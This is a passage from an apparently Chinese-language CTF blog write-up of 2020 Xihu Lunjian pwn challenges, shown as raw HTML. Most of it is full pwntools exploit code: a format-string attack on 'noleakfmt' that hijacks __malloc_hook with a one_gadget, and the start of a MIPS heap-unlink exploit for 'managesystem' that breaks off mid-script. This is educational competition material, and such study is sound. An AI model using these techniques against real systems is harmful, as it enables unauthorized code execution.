class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x5a0</span><span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>syscall<span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x04-noleakfmt"><a href="#0x04-noleakfmt" class="headerlink" title="0x04 noleakfmt"></a>0x04 noleakfmt</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/9.png"></div><h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/10.png"></div>这里有个格式化字符串的漏洞，同时可以无限循环，注意关闭了输出缓冲区。<p>第一眼看着很像unprintableV，但是注意到格式化字符串是输入到bss上，同时关了stdout，但是这里没有stderr所以不能直接改bss中stdout为stderr，所以只能操作stdout结构体了。</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>看到stdout结构体的地址在当前printf栈地址的上面，这里第一步改双链位置上的stack值到程序地址的地方，我们第一步改printf返回地址为start抬高栈地址。后面就可以改stdout的file结构体的fileno为2就可以成功输出了。</p><p>在抬高栈顶的时候选择改printf返回地址为start主要是由于在__libc_start_main中有这么一条指令就足以抬高到我们需要的地方。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/11.png"></div><p>后面我们则是通过bss上格式化字符串去改掉malloc_hook为one_gadget，最后通过输入大量字符串触发malloc执行one_gadget</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./noleakfmt"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./noleakfmt"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span>start_addr <span class="token operator">=</span> <span class="token number">0x7b0</span>malloc_hook_low <span class="token operator">=</span> <span class="token number">0x10</span><span class="token comment" spellcheck="true"># 0x45216 execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   rax == NULL</span><span class="token comment" spellcheck="true"># 0x4526a execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x30] == NULL</span><span class="token comment" spellcheck="true"># 0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x50] == NULL</span><span class="token comment" spellcheck="true"># 0xf1147 execve("/bin/sh", rsp+0x70, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x70] == NULL</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"gift : 0x"</span><span class="token punctuation">)</span>    stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">"stack address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    stack_addr_low <span class="token operator">=</span> u16<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">"stack address low 2 bytes ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr_low<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> stack_addr_low <span class="token operator">></span> <span class="token number">0x2000</span> <span class="token operator">or</span> stack_addr_low <span class="token operator">&lt;</span> <span class="token number">0x66c</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># need crack</span>        <span class="token keyword">raise</span> EOFError    payload <span class="token operator">=</span> <span class="token string">"%{}c%11$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>stack_addr_low<span class="token number">-0x0c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%37$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># need crack</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%10$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>stack_addr_low<span class="token number">-0x54</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%36$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># modify stdout to stdout->fileno</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%26$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># modify fileno 0 to 2</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%9$phhh"</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> data<span class="token number">-240</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>    success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>    malloc_hook_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%10$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>stack_addr_low<span class="token number">-0x5c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%36$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>malloc_hook_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%10$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>stack_addr_low<span class="token number">-0x5c</span><span class="token operator">+</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%36$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>malloc_hook_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%10$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>stack_addr_low<span class="token number">-0x5c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%36$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>malloc_hook_addr<span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> one_gadgets<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address    payload <span class="token operator">=</span> <span class="token string">"%{}c%10$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>stack_addr_low<span class="token number">-0x5c</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%25$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>one_gadget <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%36$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>malloc_hook_low<span class="token operator">+</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%25$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%36$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>stack_addr_low<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">"%{}c%36$hn--"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget<span class="token operator">>></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"--"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"%999999c%10$n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat flag 1>&amp;2"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./noleakfmt"</span><span class="token punctuation">)</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./noleakfmt"</span><span class="token punctuation">)</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-managesystem"><a href="#0x05-managesystem" class="headerlink" title="0x05 managesystem"></a>0x05 managesystem</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/12.png"></div>保护全关，32位的mips题目<h2 id="Ghidra分析程序"><a href="#Ghidra分析程序" class="headerlink" title="Ghidra分析程序"></a>Ghidra分析程序</h2><p>Ghidra软件介绍和安装教程<a href="https://www.secrss.com/articles/8829" target="_blank" rel="noopener">在这</a><br>用来反编译mips比较方便。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/13.png"></div>这是一个传统的菜单堆题，分别有create、show、modify、delete四个功能。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/20/2020-xi-hu-lun-jian-bu-fen-pwn-jie-ti/14.png"></div>modify的位置有溢出8个字节的漏洞，那么我们很容易就想到利用unlink进行攻击，劫持note_list。<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>在当前chunk中伪造一个0x20的堆块，同时溢出编辑下一个chunk的pre_size和pre_inuse位，这样删除下一个chunk的时候会进行向上合并，触发unlink，最后可以达到劫持note_list的目标。</p><p>写入got表，先打印出libc地址，再劫持free函数为system，delete一个带有“/bin/sh”字符串的chunk即可getshell</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'arm'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'DEBUG'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib/libc.so.0"</span><span class="token punctuation">)</span><span class="token keyword">global</span> premote_gdb<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_sh</span><span class="token punctuation">(</span>other_libc <span class="token operator">=</span> null<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> other_libc <span class="token keyword">is</span> <span class="token operator">not</span> null<span class="token punctuation">:</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">,</span> checksec <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> remote_gdb<span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel-static"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/pwn-mips/managesystem"</span><span class="token punctuation">,</span> <span class="token string">"./pwn3"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p    <span class="token keyword">else</span> <span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel-static"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/home/shinnosuke/Desktop/pwn-mips/managesystem"</span><span class="token punctuation">,</span> <span class="token string">"./pwn3"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Please use GDB remote!(Enter to continue)'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> p<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span>info<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the user info's length:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> sz <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Enter user's info:"</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the index of user:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the index of user you want edit:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"The new user's info:"</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options >>"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the index of user you want show: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> get_sh<span class="token punctuation">(</span><span class="token 